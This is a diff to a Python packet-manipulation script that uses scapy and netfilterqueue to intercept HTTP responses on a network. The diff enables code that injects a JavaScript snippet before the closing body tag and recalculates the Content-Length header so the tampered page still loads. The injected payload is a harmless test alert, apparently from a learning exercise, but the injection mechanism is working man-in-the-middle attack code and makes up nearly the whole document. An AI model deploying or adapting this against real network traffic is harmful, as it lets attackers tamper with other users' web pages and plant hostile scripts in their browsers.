@@ -7,7 +7,9 @@ import re
 
 AcceptEncodingRegex = "Accept-Encoding:.*?\\r\\n"
 replace_load = ""
-ContentLengthRegex = "Content-Length:\s\d*"
+# Content-Length non capturing group, return value, but not the key for the value.
+ContentLengthRegex = "(?:Content-Length:\s)(\d*)"
+injection_code = "<script>alert('Test!'); </script>"
 
 # Take our modified load and set it to the packet load
 def set_load(packet, load):
@@ -41,24 +43,31 @@ def process_packet(packet):
             elif scapy_packet[TCP].sport == 80:
                 print("[+] HTTP Response:  ")
                 # print(scapy_packet.show())
-                # invoke python method re replace to replace a string with another string
-                # load = load.replace("</body>", "<script>alert('Test!'); </script></body>")
-                content_length_search = re.search("Content-Length:\s\d*", load)
+                # method replace string with another string
+                load = load.replace("</body>", injection_code + "</body>")
+                # return the Content-Length value, but not Content-Lenth, from regex search
+                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
+                # if we return a value from re.search
                 if content_length_search:
-                    content_length = content_length_search.group(0)
-                    print("[+] Content Length:  " + str(content_length))
+                    # assign the second element in the group to a var
+                    content_length = content_length_search.group(1)
+                    # calculate the new content length
+                    new_content_length = 0
+                    new_content_length = int(content_length) + len(injection_code)
+                    # Assign the new content length to load
+                    load = load.replace(content_length, str(new_content_length))
 
             # if load updated, set the load to new_packet, set new_packet as packet
-            # if load != scapy_packet[Raw].load:
-            #     # Create a new packet
-            #     new_packet = set_load(scapy_packet, load)
-            #     # set the new packet with the updated payload as the packet
-            #     packet.set_payload(str(new_packet))
+            if load != scapy_packet[Raw].load:
+                # Create a new packet
+                new_packet = set_load(scapy_packet, load)
+                # set the new packet with the updated payload as the packet
+                packet.set_payload(str(new_packet))
 
     packet.accept()
 
 
 if __name__ == "__main__":
     queue = netfilterqueue.NetfilterQueue()
-    queue.bind(0, process_packet)
+    queue.bind(1, process_packet)
     queue.run()
